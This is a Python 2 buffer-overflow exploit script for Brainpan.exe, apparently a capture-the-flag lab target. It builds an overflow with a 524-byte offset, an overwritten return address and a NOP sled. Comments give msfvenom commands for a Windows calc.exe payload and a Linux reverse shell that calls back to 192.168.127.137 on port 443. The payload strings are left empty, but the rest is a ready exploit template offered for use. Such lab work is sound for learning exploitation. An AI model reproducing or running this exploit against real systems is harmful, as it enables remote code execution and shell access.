#!/usr/bin/env python
# This script was mainly done with the help from Michael LaSalvia @ https://www.youtube.com/watch?v=cr4m_-fC90Q
import sys
import socket
import struct
import time

if len(sys.argv) < 3:
  print "Usage               : python exploit.py <target IP> <platform>"
  print "Example             : python exploit.py 127.0.0.1 0       | Windows XP"
  print "                      python exploit.py 192.168.127.139 1 | Ubuntu 12.10" 
  sys.exit(0)

HOST = sys.argv[1]
PLATFORM = sys.argv[2]

if PLATFORM is "0":
  print "[+] Selecting calc.exe payload for Windows XP.."
  time.sleep(1)
  
  #------------------------------------------------------------------------------#
  # msfvenom -p windows/exec CMD=calc.exe -b "\x00" -f python -v payload         #
  #------------------------------------------------------------------------------#

  payload =  ""

  #----------------------------#
  # buffer = AAA...........AAA #
  # buffer = EIP               #
  # buffer = NOPSled           #
  # buffer = payload           #
  # buffer = BBB...........BBB #
  #----------------------------#

  buffer = "A" * 524
  buffer += struct.pack('<L', 0x311712F3)
  buffer += "\x90" * 40
  buffer += payload
  buffer += "B" * (1000-524-4-40-len(payload))

  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, 9999))
    print "[+] Connected to Brainpan.exe with IP: %s and port: 9999 " %(HOST)
    time.sleep(1)
    print "[+] Sending %s bytes of evil payload.." %len(buffer)
    time.sleep(1)
    data = s.recv(1024)
    s.send(buffer)
    print "[+] Calc.exe should pop up anytime now"
    s.close()
  except Exception,msg:
    print "[+] Unable to connect to Brainpan.exe"
    sys.exit(0)

elif PLATFORM is "1":
  print "[+] Selecting reverse shell payload for Ubuntu 12.10.."
  time.sleep(1)

  #---------------------------------------------------------------------------------------------------------------#
  # msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.127.137 LPORT=443 -b "\x00" -f python -v payload        #
  #---------------------------------------------------------------------------------------------------------------#

  payload =  ""

  #----------------------------#
  #      Buffer Structure      #
  #----------------------------#
  # buffer = AAA...........AAA #
  # buffer = EIP               #
  # buffer = NOPSled           #
  # buffer = payload           #
  # buffer = BBB...........BBB #
  #----------------------------#
  
  buffer = "A" * 524
  buffer += struct.pack('<L', 0x311712F3)
  buffer += "\x90" * 40
  buffer += payload
  buffer += "B" * (1000-524-4-40-len(payload))
  
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, 9999))
    print "[+] Connected to Brainpan.exe with IP: %s and port: 9999 " %(HOST)
    time.sleep(1)
    print "[+] Sending %s bytes of evil payload.." %len(buffer)
    time.sleep(1)
    data = s.recv(1024)
    s.send(buffer)
    print "[+] Check your netcat listener on port 443"
    s.close()
  except Exception,msg:
    print "[+] Unable to connect to Brainpan.exe"
    sys.exit(0)

else:
  print "Usage               : python exploit.py <target IP> <platform>"
  print "Example             : python exploit.py 127.0.0.1 0       | Windows XP"
  print "                      python exploit.py 192.168.127.139 1 | Ubuntu 12.10" 
sys.exit(0)
